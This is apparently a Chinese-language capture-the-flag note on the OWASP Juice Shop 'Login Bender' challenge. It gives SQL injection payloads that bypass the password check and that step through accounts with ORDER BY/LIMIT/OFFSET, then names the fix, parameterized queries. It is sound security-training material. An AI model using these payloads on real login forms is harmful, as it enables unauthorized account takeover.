- Login Bender
    - 描述：使用 Bender 的用户账号登录。
    - 思路：
        - 使用登录管理员账户挑战中的 SQL 注入
            - 登录管理员账户，确定 Bender 的邮箱为
            ```bender@juice-sh.op```
            使用 SQL 注入绕过密码验证
            ```bender@juice-sh.op'--```
            - 按顺序登录账户，直到登录目标账户
            ```' or 1=1 ORDER BY 1 LIMIT 1 OFFSET 2 --``` 
                - 在管理员页面中 ```http://127.0.0.1:3000/#/administration```
                显示的用户列表的顺序
                对应```ORDER BY 1```的数据库查询排序
        
- 编程挑战：
    与作为管理员登录相同代码，直接将输入拼接到SQL查询中，应当使用占位符预编译